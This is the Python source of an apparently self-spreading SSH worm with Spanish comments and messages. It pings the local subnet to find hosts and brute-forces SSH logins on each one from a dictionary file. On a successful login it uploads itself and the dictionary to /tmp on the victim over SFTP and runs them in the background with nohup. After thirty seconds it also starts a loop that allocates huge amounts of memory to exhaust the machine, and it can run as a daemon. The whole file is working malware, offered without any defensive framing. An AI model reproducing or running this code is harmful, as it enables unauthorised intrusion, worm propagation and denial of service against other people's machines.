#!/usr/bin/env python


import paramiko
import sys
import os
import socket    
import multiprocessing
import subprocess
import threading
import logging
import sys
import time
import random
import time
import nmap
from lib.daemon import Daemon
from threading import Timer
from queue import Queue


#* ----------------------------- Daemon--------------------------------
class YourCode(object):
    
    def run(self):
        tr1 = False
        tr2 = False
        while True:
            print('test')
            time.sleep(1)
            if (tr1 == False):
                t1 = threading.Thread(target= iniciar())
                tr1 = True
                t1.start()
                t1.join()
            if (tr2 == False):    
                t2 = threading.Thread(target= treintasec())          
                t2.start()
                t2.join()
                tr2 = True

        #t1 = threading.Thread(target= iniciar())
       # t2 = threading.Thread(target= treintasec())
        #t1.start()
        #t1.join()
        #t2.start()
        #t2.join()
        
     
           
             # after 30 seconds, "hello, world" will be printed

class MyDaemon(Daemon):
    def run(self):
        # Or simply merge your code with MyDaemon.
        print('Mi codigo')
        logging.info('Mi codigo')
        your_code = YourCode()
        your_code.run()
        
#* ----------------------------- Consumir recursos--------------------------------
def process_queue():
    print ('Consumiendo Recursos..')
    logging.info('Consumiendo Recursos..')
    while True:
            for i in range(0,51200000):
                bytearray(51200000) # array de bits
                G = 1024*1024*1024*1024/0.35265462456364534564
                a = 787878788888888888888888888888 *G/(i+0.3235324532543)
                a = (a/0.1365645356)/0.52635463457457347656353622356
                a = (a/0.1365645356)/0.52635463457457347656353622356
                a = (a/0.1365645356)/0.52635463457457347656353622356
                a = (a/0.1365645356)/0.52635463457457347656353622356
                #print (str(a)*2)


#definimos la funcion setinterval
def set_interval(func, sec):
    def func_wrapper():
        set_interval(func, sec)
        func()
    t = threading.Timer(sec, func_wrapper)
    t.start()
    return t

#!-------------------------------------------------

#* ----------------------------- para mapear la red --------------------------------
def pinger(job_q, results_q):
    """
   Haciendo Ping
    :param job_q:
    :param results_q:
    :return:
    """
    DEVNULL = open(os.devnull, 'w')
    while True:

        ip = job_q.get()

        if ip is None:
            break

        try:
            subprocess.check_call(['ping', '-c1', ip],
                                  stdout=DEVNULL)
            results_q.put(ip)
        except:
            pass


def get_my_ip():
    """
   Buscando direcciones ip
    :return:
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip


def map_network(pool_size=255):
    """
    Mapeando red
    :param pool_size: amount of parallel ping processes
    :return: list of valid ip addresses
    """

    ip_list = list()

    # get my IP and compose a base like 192.168.1.xxx
    ip_parts = get_my_ip().split('.')
    base_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.'

    # prepare the jobs queue
    jobs = multiprocessing.Queue()

    results = multiprocessing.Queue()

    pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]

    for p in pool:
        p.start()


    # cue hte ping processes
    for i in range(1, 255):
        jobs.put(base_ip + '{0}'.format(i))

    for p in pool:
        jobs.put(None)

    for p in pool:
        p.join()

    # collect he results
    while not results.empty():
        ip = results.get()
        ip_list.append(ip)

    return ip_list


#!-------------------------------------------------

def UploadFileAndExecute(sshConnection, route,passw) :
        try:
            print("[+] Copiando Archivo ")
            logging.info("[+] Copiando Archivo ")
            logging.info(route)
            sftpClient = sshConnection.open_sftp()
            sftpClient.put(route + '/scan', "/tmp/scan")
            sftpClient.put(route + '/dictionary', "/tmp/dictionary")
            sshConnection.exec_command("chmod a+x /tmp/scan")
            sshConnection.exec_command("chmod a+x /tmp/dictionary")
            print("[+] Ejecutando Archivo ")
            sshConnection.exec_command("nohup /tmp/scan start /tmp &> /tmp/nohup.out")
            sshConnection.close()
            print("[+] Archivo ejecutado: nohup /tmp/scan start /tmp" )
        except Exception as e:
                print(e.args)
                logging.error(e.args)


	#sshConnection.exec_command("nohup /tetmp/" +fileName+ " &")
   
def generate_the_word(infile):
    random_line = random.choice(open(infile).read().split('\n'))
    return random_line


def AttackSSH(ipAddress, dictionaryFile) :

                print("[H] Atacando Host : %s " %ipAddress)
                logging.info("[H] Atacando Host : %s " %ipAddress)
               
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                infile = dictionaryFile
                while True:
                 
                    try :
                        logging.info("Trycatch")
                        
                        [username, password] = generate_the_word(infile).strip().split()
                        logging.info("Usuario y clave")
                        print("[?] Intentando entrar con usuario: %s y  clave: %s [HOST: %s]" % (username, password,ipAddress))
                        logging.info("[?] Intentando entrar con usuario: %s y  clave: %s [HOST: %s]" % (username, password,ipAddress))
                        ssh.connect(ipAddress, username=username, password=password)
                    except paramiko.AuthenticationException:
                        print("[-] Auenticacion fallida: %s")
                        logging.error('"[-] Auenticacion fallida: %s"')
                    except paramiko.SSHException as sshException:
                        print("[-] No se puede establecer una conexion ssh: %s" % sshException)
                        logging.error("[-] No se puede establecer una conexion ssh: %s" % sshException)
                    except paramiko.ssh_exception.NoValidConnectionsError as sshException:
                        print("[-] No se puede conectar al puerto: %s" % sshException)
                        logging.error("[-] No se puede conectar al puerto: %s" % sshException)
                        break;
                    except Exception as e:
                        print(e.args)
                    else:
                        print("[+] Paso ... Usuario: %s y Clave %s es valida! " % (username, password))
                        logging.info("[+] Paso ... Usuario: %s y Clave %s es valida! " % (username, password))
                        UploadFileAndExecute(ssh, sys.argv[2], password)
                        break;

                    #UploadFileAndExecute(ssh, 'main')		
                
                    


def iniciar():
    try:
        print('Mapeando...')
        logging.info('Mapeando...')
        lst = map_network()
        logging.info('Listo...')
        for item in lst:
            print(item)		
            logging.info("Item: %s " %item)
            AttackSSH(item,sys.argv[2]  + '/dictionary')
    except Exception as e:
                        print(e.args)
                        logging.error(e.args)


def treintasec():
        print('Iniciando consumo de recursos despues de 30 segundos')
        logging.info('Iniciando consumo de recursos despues de 30 segundos')
        time.sleep(30)  # Sleep 5 seconds
        logging.info('Proceso iniciado')
        set_interval(process_queue,2)
  
        
def start():
        t1 = threading.Thread(target= iniciar())
        t1.start()
        t1.join()
        t2 = threading.Thread(target= treintasec())          
        t2.start()
        t2.join()

if __name__ == "__main__" :
     logging.basicConfig(filename='worn.log', level=logging.INFO)
     logging.info('Ejecutando comando: ' + sys.argv[1])
	 #AttackSSH(sys.argv[1], sys.argv[2])
     daemon = MyDaemon('/tmp/worm.pid')
if len(sys.argv) >= 2:
    if '30sec' == sys.argv[1]:
        print('Iniciando consumo de recursos despues de 30 segundos')
        iniciar()
        time.sleep(10)  # Sleep 5 seconds
        treintasec()
    if 'start' == sys.argv[1]:
        start()
    if 'service_start' == sys.argv[1]:
        print('Iniciando daemon')
        daemon.start()
    elif 'service_stop' == sys.argv[1]:
        daemon.stop()
    elif 'service_restart' == sys.argv[1]:
        daemon.restart()
    elif 'service_status' == sys.argv[1]:
        daemon.status()
    elif 'service_enable' == sys.argv[1]:
        daemon.status()    
    else:
        logging.info("Comando desconocido")
        print("Comando desconocido")
        sys.exit(2)
        logging.info('Finalizo')
    sys.exit(0)
    logging.info('Finalizo')
else:
    print ("Como usar: %s start|service_start|service_stop|service_restart y un segundo argumento que es la ruta" % sys.argv[0])
    sys.exit(2)
    logging.info('Finalizo')
 

	